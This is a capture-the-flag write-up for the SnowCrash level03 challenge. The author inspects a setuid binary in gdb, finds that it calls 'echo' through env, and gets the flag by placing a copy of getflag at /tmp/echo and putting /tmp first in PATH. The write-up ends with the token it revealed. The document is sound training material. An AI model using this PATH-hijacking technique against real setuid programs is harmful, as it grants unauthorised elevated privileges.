# SnowCrash - Level03

## Objective

Find the password for the next level by logging into the `flag03` account.

## Steps

### 1. Locate files needed for the challenge
```bash
ls 
```

A binary file named level03 is present

```bash
level03@SnowCrash:~$ file level03 
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

Not stripped is very important info, we can inspect symbols using GDB and easily track function calls. It also has the setuid bit set 

```bash
ls -la 
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

Easy to guess that it involves abusing privileges associated with the binary

Let's inspect it in gdb

```bash
(gdb) disas _start
Dump of assembler code for function _start:
   0x080483f0 <+0>:	xor    ebp,ebp
   0x080483f2 <+2>:	pop    esi
   0x080483f3 <+3>:	mov    ecx,esp
   0x080483f5 <+5>:	and    esp,0xfffffff0
   0x080483f8 <+8>:	push   eax
   0x080483f9 <+9>:	push   esp
   0x080483fa <+10>:	push   edx
   0x080483fb <+11>:	push   0x8048580
   0x08048400 <+16>:	push   0x8048510
   0x08048405 <+21>:	push   ecx
   0x08048406 <+22>:	push   esi
   0x08048407 <+23>:	push   0x80484a4
   0x0804840c <+28>:	call   0x80483d0 <__libc_start_main@plt>
```

We can see that the address of libc main is pushed onto the stack right before being called (x86 calling convention)

We then run
```bash
(gdb) disas 0x80484a4
Dump of assembler code for function main:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	and    esp,0xfffffff0
   0x080484aa <+6>:	sub    esp,0x20
   0x080484ad <+9>:	call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x18],eax
   0x080484b6 <+18>:	call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:	mov    DWORD PTR [esp+0x1c],eax
   0x080484bf <+27>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484c3 <+31>:	mov    DWORD PTR [esp+0x8],eax
   0x080484c7 <+35>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484cb <+39>:	mov    DWORD PTR [esp+0x4],eax
   0x080484cf <+43>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484d3 <+47>:	mov    DWORD PTR [esp],eax
   0x080484d6 <+50>:	call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484df <+59>:	mov    DWORD PTR [esp+0x8],eax
   0x080484e3 <+63>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484e7 <+67>:	mov    DWORD PTR [esp+0x4],eax
   0x080484eb <+71>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484ef <+75>:	mov    DWORD PTR [esp],eax
   0x080484f2 <+78>:	call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:	mov    DWORD PTR [esp],0x80485e0
   0x080484fe <+90>:	call   0x80483b0 <system@plt>
   0x08048503 <+95>:	leave  
   0x08048504 <+96>:	ret    
```

What's the most interested is the first (and only) parameter of the system syscall, which is a string, we can simply look at it in memory

```bash
(gdb) x/s 0x80485e0
0x80485e0:	 "/usr/bin/env echo Exploit me"
```

We can see that it's relying on the relative path of echo to print it's message, one way to get our flag would be unset the PATH and replace it with /tmp, copy the getflag binary into the /tmp folder and launch the binary

```bash
level03@SnowCrash:~$ cp /bin/getflag /tmp/echo
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

getflag was execution with privileges, and thus we got easy access to the flag